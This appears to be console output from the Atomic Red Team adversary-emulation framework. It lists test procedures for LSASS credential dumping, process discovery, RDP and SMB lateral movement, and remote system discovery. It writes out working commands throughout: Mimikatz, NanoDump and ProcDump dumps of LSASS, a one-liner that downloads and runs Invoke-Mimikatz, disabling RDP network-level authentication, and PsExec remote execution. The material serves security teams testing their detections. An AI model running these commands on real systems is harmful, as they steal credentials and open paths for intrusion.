Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe Memory using NanoDump
Atomic Test Number: 4
Atomic Test GUID: dddd4aca-bbed-46f0-984d-e4c5971c51ea
Description: The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.
https://github.com/helpsystems/nanodump
Upon successful execution, you should find the nanondump.dmp file in the temp directory

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
%temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"

Cleanup Commands:
Command:
del "%temp%\nanodump.dmp" >nul 2> nul

Dependencies:
Description: NanoDump executable must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe)
Check Prereq Command:
if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\n
anodump.x64.exe"
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPaylo
ads\nanodump.x64.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Offline Credential Theft With Mimikatz
Atomic Test Number: 6
Atomic Test GUID: 453acf13-1dbd-47d7-b28a-172ce9228023
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with Mimikatz. This tool is available at
 https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit

Dependencies:
Description: Mimikatz must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe)
Check Prereq Command:
if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$basePath = Split-Path "#{mimikatz_exe}" | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$basePath = Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe" | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
Description: Lsass dump must exist at specified location (%tmp%\lsass.DMP)
Check Prereq Command:
cmd /c "if not exist #{input_file} (exit /b 1)"
Check Prereq Command (with inputs):
cmd /c "if not exist %tmp%\lsass.DMP (exit /b 1)"
Get Prereq Command:
Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: LSASS read with pypykatz
Atomic Test Number: 7
Atomic Test GUID: c37bc535-5c62-4195-9cc3-0517673171d8
Description: Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.
Successful execution of this test will display multiple usernames and passwords/hashes to the screen.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
pypykatz live lsa

Dependencies:
Description: Computer must have python 3 installed
Check Prereq Command:
py -3 --version >nul 2>&1
exit /b %errorlevel%
Get Prereq Command:
echo "Python 3 must be installed manually"
Description: Computer must have pip installed
Check Prereq Command:
py -3 -m pip --version >nul 2>&1
exit /b %errorlevel%
Get Prereq Command:
echo "PIP must be installed manually"
Description: pypykatz must be installed and part of PATH
Check Prereq Command:
pypykatz -h >nul 2>&1
exit /b %errorlevel%
Get Prereq Command:
pip install pypykatz
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe Memory using Out-Minidump.ps1
Atomic Test Number: 8
Atomic Test GUID: 6502c8f0-b775-4dbd-9193-1298f56b6781
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure powershell implementation that leverages the MiniDumpWriteDump W
in32 API call. Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
Author of Out-Minidump: Matthew Graeber (@mattifestation)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump

Cleanup Commands:
Command:
Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Create Mini Dump of LSASS.exe using ProcDump
Atomic Test Number: 9
Atomic Test GUID: 7cede33f-0acd-44ef-9774-15511300b24b
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals ProcDump. This particular method uses -mm to produce
 a mini dump of lsass.exe
Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{procdump_exe}" -accepteula -mm lsass.exe #{output_file}
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp

Cleanup Commands:
Command:
del "#{output_file}" >nul 2> nul
Command (with inputs):
del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul

Dependencies:
Description: ProcDump tool from Sysinternals must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe)
Check Prereq Command:
if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump.zip"
Expand-Archive "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump.zip" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe") -Force | Out-Null
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump\Procdump.exe" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Powershell Mimikatz
Atomic Test Number: 10
Atomic Test GUID: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
Description: Dumps credentials from memory via Powershell by invoking a remote mimikatz script. If Mimikatz runs successfully you will see several usernames and hashes output to the 
screen. Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution.  Or, if you try to run the test without the required administrative 
privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
Command (with inputs):
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
'); Invoke-Mimikatz -DumpCreds
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS with createdump.exe from .Net v5
Atomic Test Number: 11
Atomic Test GUID: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
Description: Use createdump executable from .NET to create an LSASS dump.
[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
& "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id

Cleanup Commands:
Command:
Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore

Dependencies:
Description: .Net v5 must be installed
Check Prereq Command:
$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}
Get Prereq Command:
winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe using imported Microsoft DLLs
Atomic Test Number: 12
Atomic Test GUID: 86fc3f40-237f-4701-b155-81c01c48d697
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by importing built-in DLLs and calling exported functions. Xordump wil
l re-read the resulting minidump  file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.
Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
#{xordump_exe} -out #{output_file} -x 0x41
Command (with inputs):
C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41

Cleanup Commands:
Command:
Remove-Item #{output_file} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Windows\Temp\lsass-xordump.t1003.001.dmp -ErrorAction Ignore

Dependencies:
Description: Computer must have xordump.exe
Check Prereq Command:
if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path 'C:\Windows\Temp\xordump.exe') {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile C:\Windows\Temp\xordump.exe
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe using lolbin rdrleakdiag.exe
Atomic Test Number: 13
Atomic Test GUID: 47a539d1-61b9-4364-bf49-a68bc2a95ef0
Description: The memory of lsass.exe is often dumped for offline credential theft attacks.  This can be achieved with lolbin rdrleakdiag.exe. 
Upon successful execution, you should see the following files created, $env:TEMP\minidump_<PID>.dmp and  $env:TEMP\results_<PID>.hlk.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
if (Test-Path -Path "$env:SystemRoot\System32\rdrleakdiag.exe") {
      $binary_path = "$env:SystemRoot\System32\rdrleakdiag.exe"
  } elseif (Test-Path -Path "$env:SystemRoot\SysWOW64\rdrleakdiag.exe") {
      $binary_path = "$env:SystemRoot\SysWOW64\rdrleakdiag.exe"
  } else {
      $binary_path = "File not found"
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path"$env:TEMP\t1003.001-13-rdrleakdiag")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host "Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory."

Cleanup Commands:
Command:
Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1069\T1069.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1566\T1566.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1566.002\T1566.002.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Process Discovery T1057
Atomic Test Name: Process Discovery - tasklist
Atomic Test Number: 2
Atomic Test GUID: c5806a4f-62b8-4900-980b-c7ec004e9908
Description: Utilize tasklist to identify processes.
Upon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
tasklist
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Process Discovery T1057
Atomic Test Name: Process Discovery - Get-Process
Atomic Test Number: 3
Atomic Test GUID: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34
Description: Utilize Get-Process PowerShell cmdlet to identify processes.
Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Get-Process
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Process Discovery T1057
Atomic Test Name: Process Discovery - get-wmiObject
Atomic Test Number: 4
Atomic Test GUID: b51239b4-0129-474f-a2b4-70f855b9f2c2
Description: Utilize get-wmiObject PowerShell cmdlet to identify processes.
Upon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
get-wmiObject -class Win32_Process
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Process Discovery T1057
Atomic Test Name: Process Discovery - wmic process
Atomic Test Number: 5
Atomic Test GUID: 640cbf6d-659b-498b-ba53-f6dd1a1cc02c
Description: Utilize windows management instrumentation to identify processes.
Upon successful execution, WMIC will execute process to list processes. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
wmic process get /format:list
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Process Discovery T1057
Atomic Test Name: Discover Specific Process - tasklist
Atomic Test Number: 6
Atomic Test GUID: 11ba69ee-902e-4a0f-b3b6-418aed7d7ddb
Description: Adversaries may use command line tools to discover specific processes in preparation of further attacks.  Examples of this could be discovering the PID of lsass.exe to d
ump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
tasklist | findstr #{process_to_enumerate}
Command (with inputs):
tasklist | findstr lsass
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1090\T1090.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1090.002\T1090.002.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1021\T1021.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Remote Services: Remote Desktop Protocol T1021.001
Atomic Test Name: RDP to DomainController
Atomic Test Number: 1
Atomic Test GUID: 355d4632-8cb9-449d-91ce-b566d0253d3e
Description: Attempt an RDP session via Remote Desktop Application to a DomainController.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$Server=#{logonserver}
$User = Join-Path #{domain} #{username}
$Password="#{password}"
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo "RDP connection established"
Command (with inputs):
$Server=$ENV:logonserver.TrimStart("\")
$User = Join-Path $Env:USERDOMAIN $ENV:USERNAME
$Password="1password2!"
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo "RDP connection established"

Cleanup Commands:
Command:
$p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }

Dependencies:
Description: Computer must be domain joined
Check Prereq Command:
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}
Get Prereq Command:
Write-Host Joining this computer to a domain must be done manually
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: Remote Desktop Protocol T1021.001
Atomic Test Name: Changing RDP Port to Non Standard Port via Powershell
Atomic Test Number: 2
Atomic Test GUID: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
Description: Changing RDP Port to Non Standard Port via Powershell

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
Command (with inputs):
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 4489
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489

Cleanup Commands:
Command:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{OLD_Remote_Port}
Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore
Command (with inputs):
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 3389
Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: Remote Desktop Protocol T1021.001
Atomic Test Name: Changing RDP Port to Non Standard Port via Command_Prompt
Atomic Test Number: 3
Atomic Test GUID: 74ace21e-a31c-4f7d-b540-53e4eb6d1f73
Description: Changing RDP Port to Non Standard Port via Command_Prompt

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
Command (with inputs):
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489

Cleanup Commands:
Command:
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1
netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
Command (with inputs):
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f >nul 2>&1
netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: Remote Desktop Protocol T1021.001
Atomic Test Name: Disable NLA for RDP via Command Prompt
Atomic Test Number: 4
Atomic Test GUID: 01d1c6c0-faf0-408e-b368-752a02285cb2
Description: Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt Disabling NLA for RDP can allow remote user interaction with the Window
s sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microso
ft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/ See also: https://github.com/EmpireProject/Empire/blob/master/
lib/modules/powershell/management/enable_rdp.py

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f

Cleanup Commands:
Command:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1
Command (with inputs):
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Remote Services: SMB/Windows Admin Shares T1021.002
Atomic Test Name: Map admin share
Atomic Test Number: 1
Atomic Test GUID: 3386975b-367a-4fbb-9d77-4dcf3639ffd3
Description: Connecting To Remote Shares

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"
Command (with inputs):
cmd.exe /c "net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: SMB/Windows Admin Shares T1021.002
Atomic Test Name: Map Admin Share PowerShell
Atomic Test Number: 2
Atomic Test GUID: 514e9cd7-9207-4882-98b1-c8f791bae3c5
Description: Map Admin share utilizing PowerShell

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
Command (with inputs):
New-PSDrive -name g -psprovider filesystem -root \\Target\C$
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: SMB/Windows Admin Shares T1021.002
Atomic Test Name: Copy and Execute File with PsExec
Atomic Test Number: 3
Atomic Test GUID: 0eb03d41-79e4-4393-8e57-6344856be1cf
Description: Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https:
//docs.microsoft.com/en-us/sysinternals/downloads/psexec).

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{psexec_exe}" #{remote_host} -accepteula -c #{command_path}
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -c C:\Windows\System32\cmd.exe

Dependencies:
Description: PsExec tool from Sysinternals must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe)
Check Prereq Command:
if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe") { exit 0} else { exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_exe}" -Force
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsTools.zip"
Expand-Archive "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsTools.zip" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsTools\PsExec.exe" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote Services: SMB/Windows Admin Shares T1021.002
Atomic Test Name: Execute command writing output to local Admin Share
Atomic Test Number: 4
Atomic Test GUID: d41aaab5-bdfe-431d-a3d5-c29e9136ff46
Description: Executes a command, writing the output to a local Admin Share. This technique is used by post-exploitation frameworks.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
Command (with inputs):
cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - net
Atomic Test Number: 1
Atomic Test GUID: 85321a9c-897f-4a60-9f20-29788e50bccd
Description: Identify remote systems with net.exe.
Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.

Attack Commands:
